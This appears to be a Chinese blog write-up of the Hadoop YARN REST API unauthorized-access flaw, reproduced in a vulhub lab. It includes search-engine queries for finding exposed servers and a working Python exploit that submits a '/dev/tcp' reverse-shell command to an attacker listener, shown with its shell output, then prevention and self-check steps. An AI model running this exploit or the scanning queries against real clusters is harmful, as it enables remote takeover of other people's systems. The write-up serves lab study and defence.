[Hadoop Yarn REST API未授权漏洞 - rab3it - 博客园](https://www.cnblogs.com/rab3it/p/14427171.html)


[vulhub/hadoop/unauthorized-yarn at master · vulhub/vulhub · GitHub](https://github.com/vulhub/vulhub/tree/master/hadoop/unauthorized-yarn)


# 漏洞简介及危害
Apache Hadoop YARN 是 Hadoop 的核心组件之一，负责对集群中的资源进行统一管理和调度。它将资源分配给在 Hadoop 集群中运行的各种应用程序，并调度这些应用程序在不同集群节点上执行任务。确保集群资源的高效分配和任务的有序执行。

由于未授权访问漏洞，访问 `http://your-ip:8088`（默认端口）即可看到 Hadoop YARN ResourceManager WebUI 页面。攻击者可通过 [REST API](https://hadoop.apache.org/docs/r2.7.3/hadoop-yarn/hadoop-yarn-site/ResourceManagerRest.html) 部署应用、提交任务来执行任意命令。

通过未授权创建 Application 从而达到 rce 的效果，最终可完全控制集群中所有的机器。

# 公网服务识别

### fofa 搜索语法

```
app="APACHE-hadoop-YARN"
app="APACHE-hadoop-YARN" && title="All Applications"
```

### ZoomEye 搜索语法

```
app:"APACHE-hadoop-YARN"
app:"APACHE-hadoop-YARN" +title:"All Applications"
```

# 漏洞复现

利用过程如下：（exp 脚本通过此利用过程来实现）
- 在本地监听等待反弹 shell 连接
- 调用 New Application API 创建 Application
- 调用 Submit Application API 提交


### 环境部署
用 vulhub 安装测试环境
```
service docker start
cd /root/vulhub/hadoop/unauthorized-yarn
docker-compose build && docker-compose up -d
```
访问 `http://<ResourceManager_IP>:8088/cluster`，由于未授权访问，可看到 Hadoop YARN ResourceManager WebUI 页面。同样的也可以调用 api 来访问。

### 漏洞验证

`curl -v -X POST 'http://<ResourceManager_IP>:8088/ws/v1/cluster/apps/new-application'`
ps: `curl -X 指定 HTTP 请求的方法，curl -v 输出通信的整个过程`

返回 `application-id` 的值 `application_1722161355970_0004`，漏洞可能存在。 

```sh
root@ddp1:~# curl -v -X POST 'http://ddp2:8088/ws/v1/cluster/apps/new-application'
*   Trying 172.17.211.85:8088...
* Connected to ddp2 (172.17.211.85) port 8088 (#0)
> POST /ws/v1/cluster/apps/new-application HTTP/1.1
> Host: ddp2:8088
> User-Agent: curl/7.81.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< Date: Thu, 01 Aug 2024 10:10:24 GMT
< Cache-Control: no-cache
< Expires: Thu, 01 Aug 2024 10:10:24 GMT
< Date: Thu, 01 Aug 2024 10:10:24 GMT
< Pragma: no-cache
< X-Content-Type-Options: nosniff
< X-XSS-Protection: 1; mode=block
< X-Frame-Options: SAMEORIGIN
< Content-Type: application/json;charset=utf-8
< Vary: Accept-Encoding
< Transfer-Encoding: chunked
< 
* Connection #0 to host ddp2 left intact
{"application-id":"application_1722161355970_0004","maximum-resource-capability":{"memory":65536,"vCores":12,"resourceInformations":{"resourceInformation":[{"attributes":{},"maximumAllocation":9223372036854775807,"minimumAllocation":0,"name":"memory-mb","resourceType":"COUNTABLE","units":"Mi","value":65536},{"attributes":{},"maximumAllocation":9223372036854775807,"minimumAllocation":0,"name":"vcores","resourceType":"COUNTABLE","units":"","value":12}]}}}

```

### 反弹 shell
通过 vulhub 的脚本反弹 shell

[Vulhub](https://github.com/vulhub/vulhub)（一个面向大众的开源漏洞靶场）提供的提供的 [exp 脚本](https://github.com/vulhub/vulhub/blob/master/hadoop/unauthorized-yarn/exploit.py)（漏洞利用,Exploit，本意为「利用」）：

target 中填入靶机的地址 `http://<ResourceManager_IP>:8088/`
lhost 填入攻击机的 ip。目标在同一内网使用内网 IP；目标在不同网络使用公网 IP，且开放攻击机应监听的端口。通过 vulhub 的脚本反弹 shell，攻击机可直接 getshell。

```python title:"反弹 shell"
#!/usr/bin/env python

import requests

target = 'http://<ResourceManager_IP>:8088/'
lhost = '<LocalHostIp>' # put your local host ip here, and listen at port 9999

url = target + 'ws/v1/cluster/apps/new-application'
resp = requests.post(url)
app_id = resp.json()['application-id']
url = target + 'ws/v1/cluster/apps'
data = {
    'application-id': app_id,
    'application-name': 'get-shell',
    'am-container-spec': {
        'commands': {
            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
        },
    },
    'application-type': 'YARN',
}
requests.post(url, json=data)
```

python 执行该 exp，共发起两次请求，第一次申请新的 application 的 id，第二次通过得到的 id，post 我们的 payload 完成命令反弹 shell。

攻击机使用 nc 工具监听的端口要和执行的命令中的端口一致，这里使用 `9999`

shell 反弹成功后，Applications 模块下会增加一个名称为 get-shell 的任务。

攻击机监听 `9999` 端口（如果被占用可以换一个），成功则会 getshell。

安装端口监听工具并监听端口
```
yum install -y nc
sudo apt-get -y install netcat-traditional
```

```
sudo netstat -tuln | grep 9999


# 通过ufw开放
sudo ufw status

sudo ufw allow 9999/tcp
sudo ufw reload

# 或者用iptables开放
sudo iptables -L -n | grep 9999

sudo iptables -A INPUT -p tcp --dport 9999 -j ACCEPT
sudo iptables-save
```
监听端口，getshell 成功：
```
root@admin5:~# nc -lvnp 9999
Listening on [0.0.0.0] (family 0, port 9999)
Connection from <靶机IP> 46584 received!
bash: cannot set terminal process group (3247977): Inappropriate ioctl for device
bash: no job control in this shell
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

<35888_0003/container_1722529835888_0003_01_000001$ ifconfig
ifconfig

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.0.7  netmask 255.255.255.0  broadcast 10.0.0.255
        inet6 fe80::20d:3aff:fec8:8e81  prefixlen 64  scopeid 0x20<link>
        ether 00:0d:3a:c8:8e:81  txqueuelen 1000  (Ethernet)
        RX packets 17582177  bytes 13929326838 (13.9 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 24431797  bytes 10866595702 (10.8 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 96525215  bytes 137657119491 (137.6 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 96525215  bytes 137657119491 (137.6 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0 

<35888_0003/container_1722529835888_0003_01_000001$ 
```
- `-l`：表示监听模式。
- `-v`：启用详细输出模式。
- `-p`：指定端口号。
- `-n` 禁用 DNS 解析。不会尝试将 IP 地址解析为主机名，这可以提高速度并减少不必要的网络流量。



# 预防
- 关闭 Hadoop Web 管理页面，或升级修复
- 开启服务级别身份验证，如 Kerberos 认证
- 避免暴露在公网，或配置安全组、 URL 访问控制策略，限制对 YARN 服务的访问，只允许可信任的 IP 访问。

### 自查
打开 `http://<ResourceManager_IP>:8088` 访问 ResourceManager WebUI
在左侧导航栏中选择 `Applications` 查看 Application 列表，根据提交时间、用户等信息排查提交的 Applications。点击 ID 进入应用程序详情页面，在 `Application Overview` 中查看应用程序的命令信息、提交参数等详细信息。
